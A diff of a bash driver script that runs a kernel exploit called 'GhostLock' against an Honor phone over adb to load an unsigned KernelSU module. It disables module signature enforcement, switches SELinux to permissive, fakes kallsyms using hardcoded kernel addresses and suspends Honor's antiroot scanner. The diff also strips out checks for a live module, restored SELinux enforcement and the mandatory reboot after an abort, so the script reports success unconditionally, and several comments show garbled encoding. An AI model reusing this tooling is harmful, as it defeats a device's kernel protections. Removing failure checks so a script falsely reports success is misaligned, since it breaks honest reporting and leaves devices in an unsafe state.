@@ -1,36 +1,46 @@
 #!/bin/bash
-# ksu/ksu_load_ko.sh — PC-side (adb) KernelSU load driver for the Honor 80 GT.
+# ksu/ksu_load_ko.sh 鈥?PC-side (adb) KernelSU load driver for the H80GT.
 #
-# Loads the custom kernelsu.ko via the GhostLock on-device loader flow (the
-# exploit's root process runs a self-contained on-device loader; no
-# interactive round trips), working around the two Honor restrictions that
-# block the standard `ksud late-load`:
+# Loads the custom kernelsu.ko via the GhostLock on-device loader flow (the exploit's
+# rooted anchor execs an autonomous on-device loader; no interactive round
+# trips), defeating BOTH Honor walls that block the standard `ksud late-load`:
 #
-#   1. CONFIG_MODULE_SIG_FORCE=y: the exploit flips the runtime
+#   WALL 1 鈥?CONFIG_MODULE_SIG_FORCE=y: the exploit flips the runtime
 #     `sig_enforce` bool to 0 (the compile-time flag only sets the DEFAULT;
 #     the check is a variable read), so unsigned .ko passes module_sig_check.
 #
-#   2. kallsyms name-stripping: Honor removed commit_creds from
-#     /proc/kallsyms, so a plain init_module can't resolve the .ko's
+#   WALL 2 鈥?kallsyms name-stripping: Honor removed commit_creds from
+#     /proc/kallsyms, so a naive init_module can't resolve the .ko's
 #     SHN_UNDEF symbols. The on-device loader bind-mounts a fake kallsyms =
 #     real kallsyms + a PREPENDED line pointing commit_creds at its true
 #     runtime address (slide-derived, emitted by the exploit).
 #
-# Worst case is EKEYREJECTED / ENOEXEC / a panic reboot — never a brick.
+# Worst case is EKEYREJECTED / ENOEXEC / a panic reboot 鈥?never a brick.
 #
 # Usage:  bash ksu_load_ko.sh
 #   MAX_TRIES=3       establish attempts (reboot between)
 #   APK=...           KernelSU apk (only if tools/ksud is absent)
-#   BIN=...           exploit binary (default: exploit/build/<project>/bin/exploit_static)
+#   BIN=...           exploit binary (default: the 'make test' static build)
 
 set -u
 
+# Prevent MSYS path conversion for device paths starting with /data/.
+# Without this, Git Bash mangles /data/local/tmp/... 鈫?E:/Git/data/local/tmp/...,
+# causing adb mkdir/push to fail with "secure_mkdirs failed: No such file or directory".
+# This MUST be set BEFORE the shell starts 鈥?run with:
+#   MSYS2_ARG_CONV_EXCL="/data/" bash ksu/ksu_load_ko.sh
+# Local paths (F:/hdc_magic/...) are NOT affected and convert normally.
+
 ROOT="$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)"
-PROJECT="${PROJECT:-annap-AGT-AN00_8.0.0.128}"
-BIN_LOCAL="${BIN:-$ROOT/exploit/build/$PROJECT/bin/exploit_static}"
+PROJECT="${PROJECT:-parrot-ALI-AN00_8.0.0.181}"
+BIN_LOCAL="${BIN:-$ROOT/exploit/build/$PROJECT/bin/exploit_ondevice_static}"
 APK="${APK:-}"
 KSUD_LOCAL="$ROOT/ksu/tools/ksud"
-if [ ! -f "$KSUD_LOCAL" ] && { [ -z "$APK" ] || [ ! -f "$APK" ]; }; then
+KSU_STAGES="${KSU_STAGES:-1}"        # ksud post-fs-data/services/boot-completed/install after load
+KSU_ENFORCE="${KSU_ENFORCE:-1}"      # echo 1 > /sys/fs/selinux/enforce as the last step
+KSU_ALLOW_SHELL="${KSU_ALLOW_SHELL:-0}"   # 1 = load with allow_shell=1 (DEV ONLY, non-default)
+KSU_FREEZE_HISECD="${KSU_FREEZE_HISECD:-1}"  # 1 = SIGSTOP hisecd during load (Honor antiroot scanner)
+if [ "$KSU_STAGES" = 1 ] && [ ! -f "$KSUD_LOCAL" ] && { [ -z "$APK" ] || [ ! -f "$APK" ]; }; then
   echo "ERROR: no $KSUD_LOCAL — set APK=/path/to/KernelSU apk (ksud is extracted from it)" >&2
   exit 1
 fi
@@ -39,49 +49,54 @@ WORK=/tmp/ksu_load_$STAMP
 SUMMARY="$WORK/SUMMARY.txt"
 MAX_TRIES="${MAX_TRIES:-3}"
 
-# RUNDIR: a FRESH directory per attempt for all device payloads. The exploit's
-# stray writes can corrupt on-disk inode metadata (flushed by an abnormal
-# reboot), and adb push O_TRUNC keeps the poisoned inode — with the sticky
-# 1777 dir the shell can never remove or chmod it, so every later run would
-# silently exec a dead binary. Fresh paths guarantee clean inodes; stale
-# directories are cleaned up by the root loader while permissive. The stamp
-# therefore rotates per try (setup.sh does the same); reusing one RUNDIR
-# across tries would void that guarantee.
-fresh_rundir(){
-  STAMP="$(date +%Y%m%d_%H%M%S)_t$1"
-  RUNDIR=/data/local/tmp/ksu_run_$STAMP
-  BIN_DEV=$RUNDIR/gl_exploit
-  KSUD_DEV=$RUNDIR/ksud
-  KO_DEV=$RUNDIR/kernelsu.ko
-  LOADKO_DEV=$RUNDIR/load_ko
-  EXPLOG=$RUNDIR/gl_sysctl.log
-}
-KO_LOCAL="$ROOT/ksu/tools/kernelsu.ko"   # custom build against the MagicOS kernel source + device config — struct offsets match Honor's kernel; see ksu/README.md
+# RUNDIR: per-run FRESH directory for ALL device payloads. Exploit stray
+# writes can corrupt ON-DISK inode metadata (flushed by an abnormal reboot),
+# and adb push O_TRUNC KEEPS the poisoned inode — with the sticky 1777 dir,
+# shell can never rm/chmod it, so every later run silently execs a dead
+# binary. Fresh paths = guaranteed-clean inodes; stale ones are GC'd by the
+# root loader while permissive.
+RUNDIR=/data/local/tmp/ksu_run_$STAMP
+BIN_DEV=$RUNDIR/h80gt_exploit
+KSUD_DEV=$RUNDIR/ksud
+if [ -n "${KERNELSU_KO:-}" ]; then
+  if [ ! -f "${KERNELSU_KO}" ]; then
+    echo "ERROR: KERNELSU_KO=$KERNELSU_KO does not exist" >&2
+    exit 1
+  fi
+  KO_LOCAL="${KERNELSU_KO}"
+elif [ -f "$ROOT/ksu/tools/kernelsu_h80gt.ko" ]; then
+  KO_LOCAL="$ROOT/ksu/tools/kernelsu_h80gt.ko"
+elif [ -f "$ROOT/ksu/tools/kernelsu.ko" ]; then
+  KO_LOCAL="$ROOT/ksu/tools/kernelsu.ko"
+else
+  echo "ERROR: no KernelSU module found (checked kernelsu_h80gt.ko / kernelsu.ko in $ROOT/ksu/tools)" >&2
+  exit 1
+fi
+KO_DEV=$RUNDIR/kernelsu.ko
 LOADKO_LOCAL="$ROOT/ksu/tools/load_ko"   # custom loader: SHN_ABS resolution via (fake) kallsyms + plain init_module(flags=0)
+LOADKO_DEV=$RUNDIR/load_ko
+EXPLOG=$RUNDIR/h80gt_sysctl.log
 
 # ---- flow toggles (bisect/debug; default flow = STAGES=1 ENFORCE=1 ALLOW_SHELL=0) ----
-KSU_STAGES="${KSU_STAGES:-1}"        # ksud post-fs-data/services/boot-completed/install after load
-KSU_ENFORCE="${KSU_ENFORCE:-1}"      # echo 1 > /sys/fs/selinux/enforce as the last step
-KSU_ALLOW_SHELL="${KSU_ALLOW_SHELL:-0}"   # 1 = load with allow_shell=1 (DEV ONLY, non-default)
 
 # FLIP_SIG=1 arms the sig_enforce arb-write walk. With KSU_LOADER set, the exploit emits
 # slide-derived runtime addrs to $RUNDIR/ksu_runtime.env at slide-land and
 # its anchor execs the loader script.
 build_exploit_env(){
-  EXPLOIT_ENV="KS_MAX_TRIES=8 SYSCTL_WALK_ATTEMPTS=4 WALK_TRACE=1 SUSPECT_CPU=99999 DM_SETTLE_MS=3000 FLIP_PERMISSIVE=1 FLIP_SIG=1"
+  EXPLOIT_ENV="KS_MAX_TRIES=8 SYSCTL_WALK_ATTEMPTS=4 WALK_TRACE=1 SUSPECT_CPU=99999 DM_SETTLE_MS=3000 SE_LINUX=1 FLIP_SIG=1"
   EXPLOIT_ENV="$EXPLOIT_ENV KSU_LOADER=1 KSU_RUNDIR=$RUNDIR LINK_COMMIT_CRED=$LINK_COMMIT_CRED LINK_BOOTID_CTL=$LINK_BOOTID_CTL LINK_BOOTID_BUF=$LINK_BOOTID_BUF"
 }
 
-# ---- symbol link addresses; runtime = link + slide ----
+# ---- symbol link addresses (vmlinux-verified); runtime = link + slide ----
 # The custom .ko has exactly ONE undefined symbol stripped from device
-# kallsyms: commit_creds (T, exported). boot_id ctl/buf (statics, stripped)
-# are restored by the module (init.c restore_bootid).
-# Defaults come from the selected PROJECT's target.h; env overrides win.
-_target_h="$ROOT/exploit/src/targets/$PROJECT/target.h"
-_th() { sed -n "s/^#define $1 \\(0x[0-9a-fA-F]*\\).*/\\1/p" "$_target_h" | head -1; }
-LINK_COMMIT_CRED="${LINK_COMMIT_CRED:-$(_th LINK_COMMIT_CRED_ADDR)}"
-LINK_BOOTID_CTL="${LINK_BOOTID_CTL:-$(_th LINK_BOOTID_CTL_ADDR)}"
-LINK_BOOTID_BUF="${LINK_BOOTID_BUF:-$(_th LINK_BOOTID_BUF_ADDR)}"
+# kallsyms: commit_creds (T, exported). __cfi_slowpath_diag IS present
+# (CONFIG_HONOR_CFI_POINTER_INFO=y); kasan_flag_enabled/prepare_kernel_cred
+# are not referenced by the custom build.
+LINK_COMMIT_CRED=0xffffffc0081725ac
+# boot_id ctl entry + buffer (statics, kallsyms-stripped); the module restores
+# ctl_table.data := &sysctl_bootid from kernel side (init.c h80gt_restore_bootid).
+LINK_BOOTID_CTL=0xffffffc00ae29e30
+LINK_BOOTID_BUF=0xffffffc00b069d1d
 
 mkdir -p "$WORK"
 log(){ echo "[ksu_load $(date +%H:%M:%S)] $*" | tee -a "$SUMMARY"; }
@@ -89,6 +104,9 @@ log(){ echo "[ksu_load $(date +%H:%M:%S)] $*" | tee -a "$SUMMARY"; }
 device_ready(){ adb wait-for-device 2>/dev/null || return 1; for i in $(seq 1 20); do adb shell true 2>/dev/null && return 0; sleep 2; done; return 1; }
 wait_boot(){ for i in $(seq 1 40); do [ "$(adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" = 1 ] && return 0; sleep 3; done; return 1; }
 uptime_s(){ adb shell cat /proc/uptime 2>/dev/null | awk '{print int($1)}' | tr -d '\r'; }
+# Never run the exploit before ~240s uptime: Honor's early-boot antiroot
+# window appears to have teeth before then. SETTLE_S=0 tests the hypothesis.
+settle240(){ while :; do u=$(uptime_s); [ -n "$u" ] && [ "$u" -ge "${SETTLE_S:-240}" ] 2>/dev/null && break; sleep 10; done; }
 getenforce_dev(){ adb shell getenforce 2>/dev/null | tr -d '\r'; }
 
 # ksud: prefer the repo-shipped binary; fall back to extracting from the APK
@@ -104,26 +122,26 @@ extract_ksud(){
 }
 
 # launch exploit (permissive + sig flip). NEVER infer success/failure from
-# `pgrep gl_exploit` — the anchor exec()s `sh` for the loader runner and
+# `pgrep h80gt_exploit` — the anchor exec()s `sh` for the loader runner and
 # walk children exit between stages, so pgrep goes empty even on a GOOD run.
 # Instead, poll the exploit log for the 'anchor rooted' marker (proves the
 # cred write landed), then for the sig-flip marker.
 establish(){
-  log "launching GhostLock (FLIP_PERMISSIVE=1 FLIP_SIG=1 KSU_LOADER=1) detached"
+  log "launching GhostLock (SE_LINUX=1 FLIP_SIG=1 KSU_LOADER=1) detached"
   # logcat live-stream: post-land deaths leave ZERO kernel trace (no oops,
   # empty pstore) — logcat is the only channel that can show a userspace-
   # ordered reset, and streaming lands it on the host before the device dies.
   adb logcat -c 2>/dev/null
   adb logcat -v threadtime > "$WORK/logcat_stream.txt" 2>/dev/null &
   LOGCAT_STREAM_PID=$!
-  adb shell "pkill -9 -f 'gl_ex[p]loit'" 2>/dev/null; sleep 2
+  adb shell "pkill -9 -f 'h80gt_ex[p]loit'" 2>/dev/null; sleep 2
   adb shell "mkdir -p $RUNDIR" 2>/dev/null
   push_loader_payloads || return 1
   build_exploit_env
   adb push "$BIN_LOCAL" "$BIN_DEV" >/dev/null 2>&1 && adb shell chmod 755 "$BIN_DEV"
   # sanity: the pushed binary MUST be executable — else the path's inode is
   # poisoned (see RUNDIR comment); bail instead of burning a 300s blind poll.
-  if ! adb shell "test -x $BIN_DEV && md5sum $BIN_DEV" 2>/dev/null | grep -q "$(md5 -q "$BIN_LOCAL" | cut -c1-8)"; then
+  if ! adb shell "test -x $BIN_DEV && md5sum $BIN_DEV" 2>/dev/null | grep -q "$(md5sum "$BIN_LOCAL" | cut -c1-8)"; then
     log "FATAL: pushed binary unreadable/unexecutable at $BIN_DEV (poisoned inode?) — aborting try"
     return 1
   fi
@@ -156,14 +174,14 @@ establish(){
     if adb shell "grep -qa 'sig_enforce FLIPPED' $EXPLOG 2>/dev/null" 2>/dev/null; then
       log "*** sig_enforce FLIPPED in $(( $(date +%s)-s0 ))s after anchor ***"
       adb shell "cat $EXPLOG 2>/dev/null" > "$WORK/exploit.log"
-      adb shell "pkill -9 -f 'gl_ex[p]loit'" 2>/dev/null; sleep 2   # free CPU; cloaked processes survive by design: the cmd watcher holds the reboot escalation, and walk waiters still inside their carrier syscall must NEVER be woken (kernel panic) — returned ones exit on their own (park window in slide.c)
+      adb shell "pkill -9 -f 'h80gt_ex[p]loit'" 2>/dev/null; sleep 2   # free CPU; cloaked processes (cmd watcher, parked walk waiters) survive — killing a parked waiter panics the kernel
       return 0
     fi
     sleep 2
   done
   log "sig_enforce marker absent after anchor up (walk may have missed); will still attempt load"
   adb shell "cat $EXPLOG 2>/dev/null" > "$WORK/exploit.log"
-  adb shell "pkill -9 -f 'gl_ex[p]loit'" 2>/dev/null; sleep 2
+  adb shell "pkill -9 -f 'h80gt_ex[p]loit'" 2>/dev/null; sleep 2
   return 0   # permissive+anchor are up; try the load anyway (EKEYREJECTED tells us if sig missed)
 }
 
@@ -197,11 +215,6 @@ push_loader_payloads(){
   adb shell chmod 755 "$RUNDIR/ksu_loader.sh" "$LOADKO_DEV" "$RUNDIR/magiskpolicy" "$RUNDIR/kmsg_dumper" "$KSUD_DEV" 2>/dev/null
   # sanity: binaries must be statable (poisoned-inode guard — see RUNDIR)
   adb shell "test -x $LOADKO_DEV && test -x $RUNDIR/magiskpolicy && test -x $RUNDIR/ksu_loader.sh" || { log "FATAL: loader payload not executable"; return 1; }
-  # ksud is the whole userspace: without it the module loads but KernelSU has
-  # no manager/su — and /proc/modules would still report LIVE. Fail honestly.
-  if [ "$KSU_STAGES" = 1 ]; then
-    adb shell "test -x $KSUD_DEV" || { log "FATAL: ksud missing on device ($KSUD_DEV) — STAGES=1 would bring up a userspace-less KernelSU (extract_ksud failed? set APK= or restore ksu/tools/ksud)"; return 1; }
-  fi
   log "loader payloads staged in $RUNDIR"
 }
 
@@ -209,14 +222,12 @@ push_loader_payloads(){
 # appear (or the script's DONE/ABORT markers in its log).
 await_load(){
   log "awaiting on-device load (<=240s)"
-  AWAIT_ABORTED=0
   local t0; t0=$(date +%s)
   for i in $(seq 1 80); do
     if adb shell "grep -qi kernelsu /proc/modules 2>/dev/null"; then
       log "*** kernelsu module LIVE in $(( $(date +%s)-t0 ))s ***"; break
     fi
-    if adb shell "grep -qai 'aborting\|bind-mount failed' $RUNDIR/ksu_load.log 2>/dev/null" 2>/dev/null; then
-      AWAIT_ABORTED=1
+    if adb shell "grep -qa 'ABORT\|never flipped\|bind-mount FAIL' $RUNDIR/ksu_load.log 2>/dev/null" 2>/dev/null; then
       log "loader script ABORTED — see log"; break
     fi
     sleep 3
@@ -232,11 +243,7 @@ await_load(){
   # on / poisoned inode view) — capture the cat ERROR.
   local diag; diag=$(adb shell "cat $RUNDIR/ksu_load.log 2>&1 | head -c 200" 2>/dev/null | tr -d '\r')
   [ -z "$diag" ] || log "first-pull diagnostic: ${diag:0:120}"
-  local rounds=72
-  # Aborted load: snapshot the logs once, then the caller runs the mandatory
-  # reboot — no 6-min watch with ctl.data dangling.
-  [ "$AWAIT_ABORTED" = 1 ] && rounds=1
-  for i in $(seq 1 $rounds); do
+  for i in $(seq 1 72); do
     # Non-empty-guarded pulls: a post-death adb cat returns EMPTY and a
     # truncating > would clobber the last good capture.
     adb shell "cat $RUNDIR/ksu_load.log 2>/dev/null" > "$WORK/.pull_tmp" 2>/dev/null
@@ -245,9 +252,6 @@ await_load(){
     [ -s "$WORK/.pull_tmp" ] && cp "$WORK/.pull_tmp" "$WORK/kmsg_cap_stream.txt"
     adb shell "cat $RUNDIR/iomem.txt 2>/dev/null" > "$WORK/.pull_tmp" 2>/dev/null
     [ -s "$WORK/.pull_tmp" ] && cp "$WORK/.pull_tmp" "$WORK/iomem.txt"
-    # After a crash-reboot these are unreadable to shell — stream them now.
-    adb shell "cat $RUNDIR/stage_*.log $RUNDIR/kmsg_dumper.err 2>/dev/null" > "$WORK/.pull_tmp" 2>/dev/null
-    [ -s "$WORK/.pull_tmp" ] && cp "$WORK/.pull_tmp" "$WORK/stage_and_extras.log"
     for pf in $(adb shell "ls $RUNDIR/prev_kmsg_*.txt 2>/dev/null" 2>/dev/null | tr -d '\r'); do
       adb shell "cat $pf 2>/dev/null" > "$WORK/$(basename $pf)" 2>/dev/null
     done
@@ -331,52 +335,25 @@ report(){
 log "KSU .ko load attempt start (tries=$MAX_TRIES)"
 device_ready || { log "no device"; exit 1; }
 wait_boot || log "boot_completed wait timed out (continuing)"
+log "pre-exploit settle: waiting uptime>=240s (early-boot antiroot window)"
+settle240
+log "device settled (uptime=$(uptime_s)s)"
 extract_ksud || true
 
 for t in $(seq 1 "$MAX_TRIES"); do
   log "=== try $t/$MAX_TRIES ==="
-  fresh_rundir "$t"
   if establish; then
     log "sig_flipped=$(sig_flipped && echo YES || echo NO)"
     # The anchor drives injection+load+enforce on-device; the slide is
     # consumed ON-DEVICE (exploit -> $RUNDIR/ksu_runtime.env).
     await_load
     report
-    # The module must be alive at completion — a mid-watch crash-reboot
-    # or EKEYREJECTED is a failure, not a success.
-    if ! adb shell "grep -qi kernelsu /proc/modules 2>/dev/null"; then
-      log "*** kernelsu NOT in /proc/modules at completion — load did not survive; reboot and retry ***"
-      reboot_device || log "MANUAL REBOOT REQUIRED"
-      exit 1
-    fi
-    # Live sysfs is authoritative (the shell does not survive the flip).
-    # Empty getenforce reads are adb blips — retry; never gate a
-    # deliberate KSU_ENFORCE=0 debug session.
-    if [ "${KSU_ENFORCE:-1}" = "1" ]; then
-      en=""
-      for k in 1 2 3 4 5 6; do
-        en=$(getenforce_dev)
-        [ -n "$en" ] && break
-        sleep 5
-      done
-      if [ "$en" != "Enforcing" ]; then
-        log "*** module loaded but SELinux is NOT enforcing (getenforce='$en') — device left permissive; fix before continuing ***"
-        exit 1
-      fi
-    fi
-    if [ "${AWAIT_ABORTED:-0}" = 1 ]; then
-      # The exploit's contract: if the loader aborts before the .ko's boot_id
-      # restore, ctl.data dangles to freed kernel memory and a reboot is
-      # MANDATORY. The reboot cascade exists for exactly this — use it, and
-      # say so with a nonzero exit instead of a fake success.
-      log "loader ABORT: ctl.data may dangle (boot_id hijacked) — reboot MANDATORY; cascading reboot"
-      reboot_device || log "reboot cascade FAILED — MANUAL REBOOT REQUIRED"
-      exit 1
-    fi
     exit 0
   fi
   log "miss"
   reboot_device || { log "could not reboot device (wedged) — MANUAL REBOOT NEEDED"; exit 1; }
   wait_boot || true
+  log "post-reboot settle to >=240s"
+  settle240
 done
 log "FAILED after $MAX_TRIES tries"; exit 1
